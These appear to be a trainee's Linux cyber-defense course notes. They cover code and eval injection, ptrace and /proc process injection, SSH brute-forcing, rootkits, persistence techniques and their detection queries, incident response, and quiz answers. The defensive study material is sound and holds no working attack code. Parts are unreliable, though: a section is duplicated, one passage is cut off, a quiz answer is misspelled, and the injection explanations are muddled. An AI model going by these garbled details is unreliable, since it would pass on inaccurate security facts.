﻿

CWE-94 Code Injection ﻿

MITRE defines code injection as follows:

“The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."

﻿

This means that a code injection attack is possible when a segment of code in an application is not properly sanitizing input. Form fields that accept user entries are commonly vulnerable to code injections. For example, an adversary may enter a caret (^) character in the password field of a login page to escape the password management process. After the caret, the threat actor may execute additional characters as code to perform the code injection attack.

﻿

CWE-95 Eval Injection ﻿

MITRE defines eval injection as follows:

"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call.”

﻿

A dynamic evaluation call occurs when user input is accepted in unsanitized fields and passed to an eval() statement to be processed as code. In practice, an eval injection attack is similar to a domino effect. Adversaries do not need to run malicious passwords as code to execute an eval injection in a password field. Instead, the malicious password is passed to the internal hashing tool, which is then manipulated by the adversary's code to perform a code injection later in the process chain.

﻿

Local System or Application Exploits ﻿

After an adversary gains local access to a Linux system, they may need to perform additional local exploits to fully realize their goal in the attack chain. Many of these exploits work only with OS or application-specific vulnerabilities. Red Hat Security explains that application vulnerabilities occur when attackers “find faults in desktop and workstation applications (such as email clients) and execute arbitrary code, implant Trojan horses for future compromise, or crash systems. Further exploitation can occur if the compromised workstation has administrative privileges on the rest of the network."

﻿

There are many compliance regulations specific to different Linux distributions due to the greater granularity of Linux package and application management when compared to a Windows environment. Compliance regulations, such as the Defense Information Systems Agency (DISA) Security Technical Implementation Guides (STIG), provide valuable guidelines for Linux-specific system and application management on a distribution-specific basis. The DISA STIGs are a common compliance standard for many organizations that are updated often. The frequent updates are important because stale and forgotten Linux applications can quickly lead to exploitation.

﻿

Privilege Escalation Kernel Exploits ﻿

The Linux kernel is the code that works directly with the system hardware as the basis for the Linux OS. Properly exploiting a vulnerability in the kernel is a quick way to get root access. Exploits such as “Dirty Copy-On-Write” (DirtyCOW) allow adversaries to take advantage of the way that Linux handles objects in Random Access Memory (RAM). Adversaries use these types of exploits to write to memory addresses that should have been read-only, resulting in root level access.

﻿

In 2016, researchers discovered that all distributions of Linux running the Linux kernel from versions 2.6.22 to 4.8.3 were vulnerable to the DirtyCOW exploit. The vulnerability itself was first discovered by the adversaries who had been secretly exploiting it. At the time of the exploit's discovery, every Linux system on the planet was susceptible to attack. Kernel exploit prevalence highlights the need for update monitoring and maintenance. This is because out-of-date legacy systems may still contain vulnerabilities that have a wide breadth of easily actionable exploitation.

﻿Detecting Process Injection Process Injection Exploits ﻿

Process injection exploits allow an adversary to hide their malicious code inside a legitimate system process. This technique makes the adversary's malware more difficult to detect and creates a deeper layer of persistence on the exploited system. A common method for hijacking with process injection exploits is by manipulating the variable LD_PRELOAD, which was covered in module 9. This section introduces two other common methods of Linux process injection that involve the system call process trace (ptrace()) and the memory-mapped filesystem /proc.

﻿

ptrace()﻿ ﻿

The system call ptrace() [T1055/008] is a very common method for process injection in Linux. The ptrace() tool is normally used to debug or modify another system process. However, ptrace() also allows administrators to perform advanced system functions that directly manipulate how the host handles a given process. If an adversary has access to a user account that can run ptrace() on a system, they can inject code into different process elements. This enables the affected system to execute the adversary's malware inside of the infected process.

﻿

Log monitoring alerts for Linux ptrace() system calls in Security Information and Event Management (SIEM) tools work well to detect possible ptrace() process injection. The specialized nature of ptrace() means that it's very rarely used, therefore any alert indicating ptrace() use is worth investigating. In addition, a process performing abnormal actions can indicate a compromised process. Abnormal actions include opening network connections, reading and writing files, and any other out-of-context behavior.

﻿

/proc﻿ ﻿

If an adversary is able to access the filesystem /proc [T1055/009] on a Linux host, they can then enumerate memory mappings and subsequently manipulate the system process stack. Normally, the system's memory mappings are obfuscated by Address Space Layout Randomization (ASLR). However, if the adversary is able to read /proc/[pid]/maps in the filesystem, they can find out exactly where those processes are being stored in RAM. With the memory addresses, the adversary can then overwrite the process data with their own malicious code so that the system executes the malicious code when it references those memory objects.

﻿

To detect potential /proc exploitation, analysts should monitor any changes to /proc files. Any user-related file changes are cause for concern since, in nearly all cases, users should not have the permissions to modify files in this directory.

﻿

SSH Exploits ﻿

In Linux, SSH logins are the most common method for interactive remote user sessions between systems. Adversaries often attempt to gain access to Linux systems over an SSH connection through password brute-forcing or SSH key spraying.

﻿

Metasploit, the penetration testing framework, contains a wide variety of pre-made modules for testing exploits on different systems. The tool’s module ssh_login allows for password brute forcing for known and default accounts. The module simply needs a list of usernames and passwords to attempt, before providing a report on any login combinations that succeed. The module ssh_login_pubkey requires a ssh private key to be obtained from a compromised host. The module then sprays that key across the network to identify which systems accept the compromised keys for login. Even though Metasploit modules are intended to be used for testing purposes, many adversaries use these modules to identify vulnerable systems to attack.

﻿

Password brute-forcing and SSH key spraying are detected by monitoring port 22 activity using network flow logs and monitoring failed SSH login attempts in host authentication logs. In Debian-based systems, the relevant logs are located in /var/log/auth.log. In systems based in Red Hat Enterprise Linux (RHEL), these logs are located in /var/log/secure. An indicator of brute force activity is a large number of f

Which CE attack occurs when user-supplied input remains unsanitized and is processed as code immediately? Code Injection

Which CE attack occurs when user-supplied input remains unsanitized and is executed as code later in the program processing? eval injection

Detecting Process Injection Process Injection Exploits ﻿

Process injection exploits allow an adversary to hide their malicious code inside a legitimate system process. This technique makes the adversary's malware more difficult to detect and creates a deeper layer of persistence on the exploited system. A common method for hijacking with process injection exploits is by manipulating the variable LD_PRELOAD, which was covered in module 9. This section introduces two other common methods of Linux process injection that involve the system call process trace (ptrace()) and the memory-mapped filesystem /proc.

﻿

ptrace()﻿ ﻿

The system call ptrace() [T1055/008] is a very common method for process injection in Linux. The ptrace() tool is normally used to debug or modify another system process. However, ptrace() also allows administrators to perform advanced system functions that directly manipulate how the host handles a given process. If an adversary has access to a user account that can run ptrace() on a system, they can inject code into different process elements. This enables the affected system to execute the adversary's malware inside of the infected process.

﻿

Log monitoring alerts for Linux ptrace() system calls in Security Information and Event Management (SIEM) tools work well to detect possible ptrace() process injection. The specialized nature of ptrace() means that it's very rarely used, therefore any alert indicating ptrace() use is worth investigating. In addition, a process performing abnormal actions can indicate a compromised process. Abnormal actions include opening network connections, reading and writing files, and any other out-of-context behavior.

﻿

/proc﻿ ﻿

If an adversary is able to access the filesystem /proc [T1055/009] on a Linux host, they can then enumerate memory mappings and subsequently manipulate the system process stack. Normally, the system's memory mappings are obfuscated by Address Space Layout Randomization (ASLR). However, if the adversary is able to read /proc/[pid]/maps in the filesystem, they can find out exactly where those processes are being stored in RAM. With the memory addresses, the adversary can then overwrite the process data with their own malicious code so that the system executes the malicious code when it references those memory objects.

﻿

To detect potential /proc exploitation, analysts should monitor any changes to /proc files. Any user-related file changes are cause for concern since, in nearly all cases, users should not have the permissions to modify files in this directory.

﻿

SSH Exploits ﻿

In Linux, SSH logins are the most common method for interactive remote user sessions between systems. Adversaries often attempt to gain access to Linux systems over an SSH connection through password brute-forcing or SSH key spraying.

﻿

Metasploit, the penetration testing framework, contains a wide variety of pre-made modules for testing exploits on different systems. The tool’s module ssh_login allows for password brute forcing for known and default accounts. The module simply needs a list of usernames and passwords to attempt, before providing a report on any login combinations that succeed. The module ssh_login_pubkey requires a ssh private key to be obtained from a compromised host. The module then sprays that key across the network to identify which systems accept the compromised keys for login. Even though Metasploit modules are intended to be used for testing purposes, many adversaries use these modules to identify vulnerable systems to attack.

﻿

Password brute-forcing and SSH key spraying are detected by monitoring port 22 activity using network flow logs and monitoring failed SSH login attempts in host authentication logs. In Debian-based systems, the relevant logs are located in /var/log/auth.log. In systems based in Red Hat Enterprise Linux (RHEL), these logs are located in /var/log/secure. An indicator of brute force activity is a large number of failed logins or a user account attempting to log in to many computers simultaneously.

﻿Which process injection method uses memory address enumeration from the filesystem? /proc

Which process injection method uses a process debugging system call to inject code into running processes? ()pctrace

Detecting Rootkits Linux Rootkits ﻿

After compromising a system, many adversaries install a rootkit [T1014] on a target to gain stealth persistence on the affected host. Rootkits are malware that hijack the Linux kernel and allow adversaries full control over how the OS behaves. Adversaries exploit a target with either a user mode rootkit or a kernel mode rootkit [T1547/006].

﻿

User Mode Rootkits ﻿

Many user mode rootkits found today are derived from other common rootkits such as LD_PRELOAD or the JynxKit, which is also based on LD_PRELOAD. These rootkits are designed to function like installed malware. They modify login shells like sshd to maintain a persistent backdoor to a target machine. User mode rootkits can also modify su or sudo to allow easy privilege escalation. These rootkits also modify logging (syslogd), processes (ps, pidof, top), files (ls, find), and many other OS functions to hide the adversary's presence on a host. There are thousands of user mode Linux rootkits. However, the similarity at the core of all Linux rootkits is that they all modify Linux user components in some way to manage the same end of taking control of a system and hiding the rootkit's presence.

﻿

To detect user mode rootkits, analysts can use packet sniffers from outside the suspected host. The packet sniffers can help analysts identify abnormal traffic that may indicate the presence of rootkits. Another option for identifying an installed rootkit is to isolate the affected system and scan the host with another tool. The tools Chkrootkit and Rootkit Hunter (rkhunter) scan local systems and identify malware that attempts to mask its existence on a host. The tool Linux Malware Detect (LMD) cross-references known threat data to identify and remove malware.

﻿

Kernel Mode Rootkits ﻿

In most Linux distributions, kernel mode Rootkits manipulate the Linux Kernel Modules (LKM) in /lib/modules or /usr/lib/modules. These LKMs are loaded when the host boots to build and run the OS. The most common kernel modules found in /usr/lib/modules contain hardware device drivers and other user-added modules. Rootkits allow adversaries to keep their control over the target system. Kernel mode rootkits operate at the kernel level in an operating system, often altering applications at this level. This technique obfuscates the rootkit from standard methods of detection.

﻿

After compromising a target system, adversaries can achieve any of following activities:

Modify login services such as sshd to maintain persistence.

Modify su or sudo to elevate privileges.

Alter processes and system events to obfuscate detection.

Execute code within other legitimate system processes trusted throughout the network for lateral movement.

Possible indicators of compromise include any changes to folders that are not authorized by a systems administrator, such as /lib/modules, /usr/lib/modules, lsmod, and /proc/modules. However, if an adversary has installed a rootkit on a host, they can delete syslogs, manipulate command histories, and even interrupt the Linux kernel to ignore its primary security functions and permissions. Because of this, rootkits can be difficult to detect once they've been installed, so an infected system cannot be trusted.

﻿

While scanning tools can sometimes detect kernel rootkits, this type of malware usually requires memory analysis or diff-based system comparison with known good images. Upcoming modules provide more information on these in-depth methods of detection. Removing these rootkits often involves completely reimaging a host and restoring the fresh image with recovered data that can be verified as non-compromised if file hash validation is available.

﻿2. Open a new terminal session.

Run Rootkit Hunter to search the filesystem for any potential rootkits using the following case-sensitive command:
sudo /home/trainee/Downloads/rkhunter-1.4.6/files/rkhunter -c -sk
Display the log file at /var/log/rkhunter.log with the following command, to examine a rootkit detection report:
sudo less /var/log/rkhunter.log
Figure 5.2-1, below, displays the detection report:

Search for running processes using the command less and the following command: /running_procs

Enter q to quit the command less.

Some rootkits are tagged based on their activity, while other tags are based on file contents. The logs display the processes and files that are suspicious and should be examined. Use the information from this lab to answer the next question.

Linux Persistence Overview A threat actor gains persistence on a Linux system by creating a backdoor, in case access to the target system is lost. Completely ridding a system of a threat actor is therefore difficult for defenders since the adversaries are able to continue gaining access through their persistence methods. If defenders are not aware of persistence TTPs on Linux, they will only be able to remove a portion of the threat actor toolkit, leaving the system vulnerable for the next inevitable attack.

﻿

Adversaries have many methods of establishing persistence from which to choose. Detecting each method requires proper logging. A simple way to gather the required logging is to deploy Elastic’s Auditbeat configured with the auditd, system, and file integrity modules while employing a best practice auditd rule set. Florian Roth offers one such rule set on GitHub, which is provided in the additional resource section of this task.

﻿

Understanding the basic and advanced methods of Linux persistence and how to detect them allows defenders to more decisively expel adversaries from a system the first time, by ensuring that no backdoors exist. This detection becomes more difficult when threat actors deploy kernel rootkits using a persistence method because kernel rootkits are able to intercept system calls. Additional details about working with this type of TTP is explained in an upcoming module.

Which Elastic Beat provides auditd, system, and file integrity modules? auditbeat

Common Linux Persistence Methods There are many different methods of obtaining persistence on a Linux system. Defenders who continuously learn new methods of persistence are better prepared to ensure the detections in place are effective for catching adversaries. This section introduces four advanced methods that fall under the following MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) techniques:

T1543.002 Systemd Service

T1037.004 Run Control (RC) Scripts

T1098 Secure Shell (SSH) Authorized Keys

T1505.003 Web Shell

T1574.008 Path Interception by Search Order Hijacking

Systemd Service and RC Scripts ﻿

Adversaries may obtain persistence by creating or modifying a service to execute a malicious payload. Every service has a service unit file that controls how and when the service is run. These files are located in the directories /etc/systemd/system and /usr/lib/systemd/system and have an extension of .service. Modifying a service unit file in the aforementioned location requires root privileges by default. This prevents a low privilege user from modifying those service unit files. However, user-level persistence is still possible by modifying or creating service unit files located in the directory ~/.config/systemd/user.

﻿

To detect the systemd services used for persistence, defenders should monitor for usage of the commands systemctl and service. Defenders should also monitor for new or modified files in the following directories:

/etc/systemd/system

/usr/lib/systemd/system/

~/.config/systemd/user/

Before systemd existed, init was the standard daemon used to initialize, manage, and track services and daemons. Threat actors still use init to maintain persistence using RC scripts. RC scripts are executed during system startup to launch custom services. Threat actors can modify the RC scripts to contain paths to malicious binaries and shell commands. Detecting this activity requires monitoring and auditing the file /etc/rc.local for unapproved changes.

﻿

Determining potential malicious activity is much easier when defenders have a baseline of approved services. Another way to identify a potentially malicious service is by researching the name of the service. If information about the service is unavailable online, this should raise suspicions. If the name of an enabled service does not look familiar, investigating the surrounding traffic can provide additional context for determining whether or not the service is legitimate. For example, in an investigation of an unrecognized service, an analyst may find suspicious network traffic occurring right after the service was enabled. That traffic may reveal an attempted callback for a reverse shell or similar unexpected activity.

﻿

SSH Authorized Keys ﻿

The SSH file /home//.ssh/authorized_keys defines the keys that are authorized for use during key-based authentication. Threat actors abuse this feature to gain persistence on a host by creating their own SSH key and adding the public key to the file authorized_keys.

﻿

File integrity logging is useful for detecting this type of activity because changes to the file authorized_keys are uncommon. Defenders can monitor for changes to this file to receive alerts that should prompt further investigation.

﻿

Another file that should be monitored is /etc/ssh/sshd_config. A threat actor may add their public key to authorized_keys and find that the file sshd_config does not allow for public key authentication. In this case, the threat actor must edit the configuration file sshd_config and change the values for the fields PubkeyAuthentication and RSAAuthentication to yes.

﻿

Web Shell ﻿

One type of backdoor on a Linux web server is a web shell. A web shell is a script that allows threat actors to use the web server as a gateway into a network. Analysts can audit changes to public folders to catch any malicious web scripts being added. These folders include /var/www/html and any other directory hosting internet-facing files. Another option is to monitor for web servers accessing files that are not in the web directory or files that are spawning processes that a web server should not need to spawn.

﻿

Path Interception by Search Order Hijacking (Binary Wrapping) ﻿

A threat actor can hijack the use of common system commands on Linux to create a stealthy backdoor. For example, adding a binary named hostname to the directory /usr/local/bin/ hijacks the use of /bin/hostname. This is because the user-specific bin directory has priority over the system-wide bin directory when running a command without the absolute path. The threat actor can add anything they want to the directory /usr/local/bin/hostname, make it executable, and then use that binary in a scheduled task to inconspicuously launch their backdoor. A defender can check the search order by running the command echo $PATH to list the current $PATH configuration. The search order priority is presented left to right. A threat actor can modify the $PATH to change the search order in preparation for a persistence method they plan on using. Organizations should always use absolute paths in system administration scripts to avoid search order hijacking.

﻿

Analysts may need to monitor various types of activities to effectively detect when file permissions are being modified. Auditing the usage of the command chmod may help analysts identify suspicious files in user-specific bin locations that threat actors are making executable. However, a threat actor may not need chmod if they change the command umask to 000 and then create a file because this makes the file globally executable. Analysts should be suspicious if they see a normal system command that is located by default in /bin or if the command is added to /usr/local/bin and made an executable. Additionally, monitoring surrounding network traffic after the execution of a suspicious binary often leads to the detection of suspicious network traffic.

﻿

﻿

Detection Recommendations ﻿

Table 5.3-1, below, provides a quick reference of the items to monitor to detect each of the common persistence TTPs described above. These items comprise a mix of directories and files (paths), commands, and activities.

﻿Indications of Linux Persistence All four of the common Linux persistence methods were used in the large dataset from the previous workflow. These methods include the following:

Systemd service

SSH authorized_keys

Web shell

Binary wrapping

Systemd Service ﻿

Description ﻿

A malicious service was created called ntsh.service. It was started, enabled, and daemon-reload was run.

﻿

Query ﻿

Running the following query and then creating a table visualization to review all the process.title values reveals the suspicious process:

process.title: (systemctl OR service) ﻿

SSH Authorized Keys ﻿

Description ﻿

The root user modified /home/JCTE/.ssh/authorized_keys and /etc/ssh/sshd_config.

﻿

Query ﻿

Running the following query reveals this activity:

event.module: file_integrity AND file.path: (.ssh/authorized_keys OR /etc/ssh/sshd_config) ﻿

Web Shell ﻿

Description ﻿

A suspicious php script named bdoor.php was created in /var/www/html.

﻿

Query ﻿

Running the following query reveals this activity:

process.title: /var/www/html OR file.path: /var/www/html ﻿

Binary Wrapping ﻿

Description ﻿

A suspicious binary named date was created in /usr/local/bin. The binary date is a standard system binary that is located in /bin by default.

﻿

Query ﻿

Running the following query reveals this activity:

process.title: /usr/local/bin OR file.path: /usr/local/bin

MITRE D3FEND MITRE D3FEND Overview ﻿

MITRE developed D3FEND as a repository of defensive cybersecurity techniques designed to counteract offensive techniques by adversaries. Understanding D3FEND is an asset for any party involved in security systems architecture because it is an effective resource for helping to keep networks as secure as possible.

﻿

D3FEND consists of five stages. Table 5.4-1, below, presents the critical goal and common defense techniques employed at each stage.

MITRE D3FEND and Incident Response ﻿

Incident response techniques and strategies are found in the isolate, deceive, and evict stages. Once an incident has been detected, it is the role of an incident response team to isolate the activity to a portion of the network, lure the activity to an intended location or object, and then evict the activity from the network.

incident Response Incident Response Overview ﻿

Incident response is a primary component of the defense of any network. The National Institute of Standard and Technology (NIST) defines incident response as “the mitigation of violations of security policies and recommended practices.” However, this mitigation does not start solely after an incident occurs. Incident response is an ongoing process, so it is a best practice for analysts and teams to be ready at all times. To conduct effective IR mitigation, defenders require the most recent applicable techniques and threat intelligence to prepare for and respond to adversaries. Below are the tasks surrounding the preparation and response activities that apply to all types of IR.

﻿

Preparation ﻿

IR preparation includes methods and strategies for arranging response techniques to an incident. Efficient preparation leads to efficient IR. Common preparation strategies include the following:

Synchronize time across the network Manage logs Establish Baseline Synchronize Time Across the Network﻿

﻿

A network may include portions, devices, and hosts physically located in different locations. In the preparation stage, it is critical to synchronize time across the network so that defenders can make sense of event data such as the time and sequence of events.

﻿

Manage Logs﻿

﻿

A Security Information Event Management (SIEM) tool that analyzes log entries and activity enables defenders to address incidents effectively and appropriately. In preparation for IR, logs that require further analysis should be generated, saved, and sent to the appropriate SIEM to refer back to, as needed.

﻿

Establish Baseline﻿

﻿

Baselining refers to documenting, saving, and analyzing any hardware, software, databases, and relevant documentation for a system, at a given point in time. Any components on the network that are suspected to be affected by an incident require a baseline. Any data and applicable resources should then be duplicated and kept as a backup.

﻿

Response ﻿

The response part of IR includes the methods and strategies used to address and mitigate an incident. When responding to an incident, Cyber Protection Teams (CPTs) must complete the following steps:

Analyze the scope Build a timeline Confirm the incident Isolate affected hosts Deceive and evict adversary activity Analyze memory Step 1: Analyze the Scope﻿

﻿

One component in responding to an incident is to understand the scope. An incident can be triggered with only a small portion of intelligence, however, the scope starts growing as response activities get underway. Defenders may need to triage the incident remotely to prevent the scope of the incident from growing. Endpoint tools are helpful for remote triage. An endpoint tool such as Beats collects and sends data to the Elastic Stack for analysts to view and assess remotely. The remote access to host data enables an effective assessment and effective means of response while also reducing the time to respond.

﻿

Step 2: Build a Timeline﻿

﻿

A timeline helps to understand the time and duration of relevant actions. Construction of a timeline may provide analysts a clear picture of the sequence of events leading to the incident. There are several documents to examine to build a timeline, as covered in the Cyber Defense Analyst - Basic (CDAB) course. Examining external reporting and observing the Operation Notes (OPNOTE) of other analysts are critical tasks at this stage. Building a timeline of the incident involves the following key documents:

Situational Reports (SITREP): Routinely generated to provide updates to higher elements on a daily, weekly, per-phase, or on request. Tactical Assessments: Low-level assessments that often contain their own Measures of Effectiveness (MOE) and Measures of Performance (MOP). OPNOTEs: In-depth and technical information about the events that occur during mission execution, containing very specific timestamps and events. When more detail than a high-level summary is needed, consult the OPNOTEs. OPNOTEs are helpful in developing an execution timeline that includes reports on health and status as well as cyber IR.

﻿

Many US government agencies publish health and status reports on a regular basis to aid with situational awareness of current operational activities. This enables the capacity to build, defend, and operate in cyberspace. These reports have a variety of functions, but they are especially useful in establishing past trends and assessing their impact on the mission partner’s network.

﻿

Additionally, DoD agencies must abide by the cyber incident handling program defined in the Chairman of the Joint Chiefs of Staff Manual (CJCSM) 6510.01B. This document outlines a specific incident response report template. The completed reports are stored in the Joint Incident Management System (JIMS) on Secret Internet Protocol Router Network (SIPRNet). Past incidents provide a historic picture of the network, as well.

﻿

Step 3: Confirm the Incident﻿

﻿

In the third step, defenders confirm the incident prior to employing any techniques aimed at addressing the incident, to ensure their plans are valid. In this stage, any reported Indicators of Compromise (IOC) and Tactics, Techniques, and Procedures (TTP) are leveraged to check and validate the incident occurred on the network. Confirming the incident may include tasks such as checking for unusual processes, altered system files, hidden files or processes, and modified log entries.

﻿

Step 4: Isolate Affected Hosts﻿

﻿

Isolating affected hosts is the temporary removal of the hosts from the network. An affected host may contain components designed to impact other portions, devices, or hosts on the network. If a host is affected by an incident it must be isolated in an effort to contain the incident.

﻿

Step 5: Deceive and Evict Adversary Activity

﻿

Deceiving and evicting adversary activity involves luring the adversary to an intended location of the network and removing them from the network. Options for luring adversaries include developing honeypots or decoy files and controlled areas containing information that would be useful to the adversary. When the adversary interacts with the decoy, strategies such as account locking and process termination are implemented to evict the adversary from the network.

﻿

Step 6: Analyze Memory

﻿

Memory analysis involves strategies to capture and analyze the components that comprise the memory of affected hosts. Strategies in memory analysis include dumping memory from the affected hosts. Once the memory is dumped, it can be reassembled in a safe environment for further analysis. Saving the memory from the incident can aid in the defense measures to prevent similar incidents from reoccurring on the network.

image

image

image

kibana timeframe and ip 
message|contains << for script just in case
| select -expandproperty message                       for script if it doesnt work the first time
host.ip look at the question is it asking for the payload or ip's
ip
install packages dpkg -l <<<<<<<<<<<<<<<<
post is the server response the get is the user getting it
                       through what port does it connect with = its own port
                                                 Diamorphine
                                                 /var/www/ >> ls -l
                                                 ls -l shell.php  sooooooooooooooo /var/www/html/shel.php      linux persistance 
                                                 rhp or server or client
                                                 remember to pass





